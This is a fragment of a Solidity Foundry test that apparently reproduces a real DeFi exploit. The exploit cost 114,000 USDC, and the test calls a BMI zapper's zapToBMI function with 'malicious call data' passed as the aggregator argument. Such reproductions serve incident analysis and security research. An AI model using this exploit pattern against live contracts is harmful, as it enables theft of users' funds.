...
// @KeyInfo - Total Lost : 114,000 USDC
...
// @Analysis
// https://x.com/0xmstore/status/1747756898172952725?s=20
...
contract ExploitTest is Test {
  ...
  function testExploit() external {
    ...
    bmiZapper.zapToBMI(
      address(BUSD), // BUSD
      0, // _amount
      address(0), // _fromUnderlying (not relevant for this exploit)
      0, // _fromUnderlyingAmount (not relevant for this exploit)
      0, // _minBMIRecv (not relevant for this exploit)
      bmiConstituents,
      bmiConstituentsWeightings,
      address(USDC), // _aggregator
      maliciousCallData, // _aggregatorData (malicious call data)
      true // refundDust
    );
